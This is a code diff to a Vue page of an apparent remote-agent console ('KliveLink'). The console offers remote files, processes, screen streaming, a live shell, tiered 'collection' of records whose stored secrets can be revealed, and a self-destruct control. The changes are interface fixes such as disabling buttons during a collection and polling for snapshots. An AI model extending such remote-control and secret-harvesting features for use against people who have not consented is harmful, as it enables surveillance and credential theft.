@@ -18,7 +18,7 @@
       </div>
       <div class="ot-actions">
         <button class="ot-btn ghost" :disabled="busy" @click="refreshAll">{{ busy ? 'Working…' : 'Refresh' }}</button>
-        <button v-if="canControl" class="ot-btn ghost" :disabled="!detail?.IsConnected" @click="collectNow('T0')">Collect T0</button>
+        <button v-if="canControl" class="ot-btn ghost" :disabled="!detail?.IsConnected || collectionRunning" @click="collectNow('T0')">Collect T0</button>
         <NuxtLink to="/klivelink" class="ot-btn ghost">Fleet</NuxtLink>
       </div>
     </div>
@@ -74,7 +74,7 @@
             <button class="ot-btn" :disabled="!canFiles || !detail?.IsConnected" @click="go('files')">Files</button>
             <button class="ot-btn" :disabled="!canControl || !detail?.IsConnected" @click="go('processes')">Processes</button>
             <button class="ot-btn" :disabled="!canControl || !detail?.IsConnected" @click="go('screen')">Screen</button>
-            <button class="ot-btn" :disabled="!canCollection || !detail?.IsConnected" @click="collectNow('T0')">Collect T0</button>
+            <button class="ot-btn" :disabled="!canCollection || !detail?.IsConnected || collectionRunning" @click="collectNow('T0')">Collect T0</button>
             <button class="ot-btn ghost" @click="go('collection')">Collection</button>
             <button class="ot-btn ghost" @click="go('audit')">Audit</button>
             <button class="ot-btn ghost danger" :disabled="!canDestroy" @click="selfDestruct">Self-destruct</button>
@@ -116,12 +116,12 @@
     <div v-else-if="tab === 'collection'" class="tab-body">
       <div class="collection-head">
         <div class="ot-segment sm" role="group" aria-label="Collection tier">
-          <button :aria-pressed="collectionTier === 'T0'" @click="collectNow('T0')">T0 fast</button>
-          <button :aria-pressed="collectionTier === 'T1'" @click="collectNow('T1')">T1 full</button>
-          <button :aria-pressed="collectionTier === 'T2'" @click="collectNow('T2')">T2 deep</button>
+          <button :aria-pressed="collectionTier === 'T0'" :disabled="collectionRunning" @click="collectNow('T0')">T0 fast</button>
+          <button :aria-pressed="collectionTier === 'T1'" :disabled="collectionRunning" @click="collectNow('T1')">T1 full</button>
+          <button :aria-pressed="collectionTier === 'T2'" :disabled="collectionRunning" @click="collectNow('T2')">T2 deep</button>
         </div>
         <input v-model="collectionQuery" class="ot-input auto" type="search" placeholder="Search name, source, user, URL…" />
-        <button class="ot-btn" :disabled="!canCollection || !detail?.IsConnected" @click="collectNow('T0')">Collect T0</button>
+        <button class="ot-btn" :disabled="!canCollection || !detail?.IsConnected || collectionRunning" @click="collectNow('T0')">Collect T0</button>
       </div>
 
       <div class="ot-grid two">
@@ -170,7 +170,8 @@
                 <td class="truncate" :title="r.SourcePath">{{ r.SourcePath }}</td>
                 <td :title="r.ExpiresAt">{{ r.ExpiresAt ? relative(r.ExpiresAt) : '—' }}</td>
                 <td>
-                  <button class="ot-btn ghost sm" :disabled="!canDownload" @click="reveal(r)">{{ revealed[r.RecordId] ? 'Hide' : 'Reveal' }}</button>
+                  <button v-if="r.HasSecret" class="ot-btn ghost sm" :disabled="!canDownload" @click="reveal(r)">{{ revealed[r.RecordId] ? 'Hide' : 'Reveal' }}</button>
+                  <span v-else class="muted">—</span>
                   <code v-if="revealed[r.RecordId]" class="secret">{{ revealed[r.RecordId] }}</code>
                 </td>
               </tr>
@@ -408,15 +409,26 @@ async function loadInfo() {
 }
 async function refreshAll() {
   busy.value = true; error.value = '';
-  try { await Promise.all([loadDetail(), loadInfo(), loadAudit()]); }
+  try {
+    await loadDetail();
+    if (tab.value === 'overview') await loadInfo();
+    if (tab.value === 'audit') await loadAudit();
+    if (tab.value === 'collection') await loadCollection();
+    if (tab.value === 'processes') await loadProcesses();
+    if (tab.value === 'files') await listFiles();
+  }
   catch (e: any) { error.value = e?.message; }
   finally { busy.value = false; }
 }
 
 async function collectNow(tier: 'T0' | 'T1' | 'T2' = 'T0') {
   collectionTier.value = tier;
-  busy.value = true; error.value = '';
+  if (collectionRunning.value) return;
+  error.value = '';
   try {
+    const beforeRes = await RequestGETFromKliveAPI(`/klivelink/v2/collection/snapshots?agentId=${encodeURIComponent(agentId.value)}&limit=1`);
+    const beforeList = beforeRes.ok ? await beforeRes.json().catch(() => []) : [];
+    const before = beforeList?.[0]?.SnapshotId;
     const res = await RequestPOSTFromKliveAPI('/klivelink/v2/collection/start', JSON.stringify({
       agentId: agentId.value,
       tier,
@@ -424,10 +436,37 @@ async function collectNow(tier: 'T0' | 'T1' | 'T2' = 'T0') {
       maxBytes: tier === 'T0' ? 50 * 1024 * 1024 : tier === 'T1' ? 500 * 1024 * 1024 : 2 * 1024 * 1024 * 1024,
     }), true, true);
     if (!res.ok) { const detail = await res.json().catch(() => null); throw new Error(detail?.error || `HTTP ${res.status}`); }
-    notice.value = `Collection ${tier} started.`;
-    await Promise.all([loadDetail(), loadCollection()]);
-  } catch (e: any) { error.value = e?.message; }
-  finally { busy.value = false; }
+    collectionRunning.value = true;
+    notice.value = `Collection ${tier} started; waiting for the snapshot…`;
+    void waitForCollection(tier, before);
+  } catch (e: any) { error.value = e?.message; collectionRunning.value = false; }
+}
+
+async function waitForCollection(tier: string, before?: string) {
+  const started = Date.now();
+  try {
+    while (Date.now() - started < 180_000) {
+      await new Promise(r => setTimeout(r, 3000));
+      const res = await RequestGETFromKliveAPI(`/klivelink/v2/collection/snapshots?agentId=${encodeURIComponent(agentId.value)}&limit=1`);
+      if (res.ok) {
+        const list = await res.json().catch(() => []);
+        const latest = list?.[0]?.SnapshotId;
+        if (latest && latest !== before) {
+          await Promise.all([loadDetail(), loadCollection()]);
+          notice.value = `Collection ${tier} complete.`;
+          return;
+        }
+      }
+      await loadDetail().catch(() => {});
+      if (!detail.value?.IsConnected) {
+        notice.value = `Collection ${tier} interrupted: agent disconnected.`;
+        return;
+      }
+    }
+    notice.value = `Collection ${tier} is taking longer than expected; refresh later.`;
+  } finally {
+    collectionRunning.value = false;
+  }
 }
 
 const processes = ref<any[]>([]);
@@ -452,6 +491,7 @@ const terminalEl = ref<HTMLElement | null>(null);
 const liveShell = ref(false);
 let shellSocket: WebSocket | null = null;
 function startLiveShell() {
+  if (shellSocket || liveShell.value) return;
   try { shellSocket?.close(); } catch {}
   shellSocket = new WebSocket(BuildKliveWsUrl('/klivelink/v2/agents/shell/stream', { agentId: agentId.value }));
   shellSocket.onopen = () => { liveShell.value = true; terminalHistory.push({ command: '', output: '[live shell connected]', error: '', running: false }); };
@@ -545,6 +585,7 @@ const screenFrame = ref('');
 const screenMeta = ref<any>(null);
 let screenSocket: WebSocket | null = null;
 async function startScreen() {
+  if (screenActive.value) return;
   try {
     await command('ScreenStart', { monitorIndex: screenMonitor.value, quality: 50, intervalMs: 700 });
     screenActive.value = true;
@@ -574,6 +615,7 @@ const collectionTier = ref<'T0' | 'T1' | 'T2'>('T0');
 const collectionQuery = ref('');
 const collectionCategory = ref('');
 const loadingCollection = ref(false);
+const collectionRunning = ref(false);
 const revealed = reactive<Record<string, string>>({});
 const filteredRecords = computed(() => {
   const q = collectionQuery.value.toLowerCase().trim();
@@ -600,7 +642,7 @@ async function reveal(record: any) {
   try {
     const res = await RequestGETFromKliveAPI(`/klivelink/v2/collection/record?recordId=${encodeURIComponent(record.RecordId)}&reveal=true`);
     const data = await res.json();
-    revealed[record.RecordId] = data.Secret || '(empty or locked)';
+    revealed[record.RecordId] = data.Secret || '(locked)';
   } catch (e: any) { error.value = e?.message; }
 }
 async function downloadBundle(snapshot: any) {
@@ -697,16 +739,27 @@ function base64Blob(base64: string) {
   return new Blob([bytes]);
 }
 
-watch(tab, (value) => {
-  if (value === 'processes') loadProcesses();
-  if (value === 'files') listFiles();
-  if (value === 'collection') loadCollection();
-  if (value === 'audit') loadAudit();
-  if (value === 'screen') { /* start is explicit */ }
-});
-watch(agentId, () => { refreshAll(); if (tab.value === 'collection') loadCollection(); }, { immediate: true });
+watch([agentId, tab], async ([id, value], previous) => {
+  if (!id) return;
+  const agentChanged = !previous || previous[0] !== id;
+  const tabChanged = !previous || previous[1] !== value;
+  if (previous && previous[1] !== value) {
+    if (previous[1] === 'terminal') stopLiveShell();
+    if (previous[1] === 'screen') stopScreen();
+  }
+  if (agentChanged) {
+    try { await loadDetail(); } catch (e: any) { error.value = e?.message; return; }
+  }
+  if (!agentChanged && !tabChanged) return;
+  if (value === 'overview') { await loadInfo(); await loadAudit(); }
+  if (value === 'processes' && detail.value?.IsConnected) await loadProcesses();
+  if (value === 'files' && detail.value?.IsConnected) await listFiles();
+  if (value === 'collection') await loadCollection();
+  if (value === 'audit') await loadAudit();
+  if (value === 'terminal' && canControl.value && detail.value?.IsConnected) startLiveShell();
+  if (value === 'screen' && canControl.value && detail.value?.IsConnected) await startScreen();
+}, { immediate: true });
 
-onMounted(() => { refreshAll(); });
 onBeforeUnmount(() => { try { screenSocket?.close(); } catch {} try { shellSocket?.close(); } catch {} if (purgePoll) clearInterval(purgePoll); });
 </script>
 
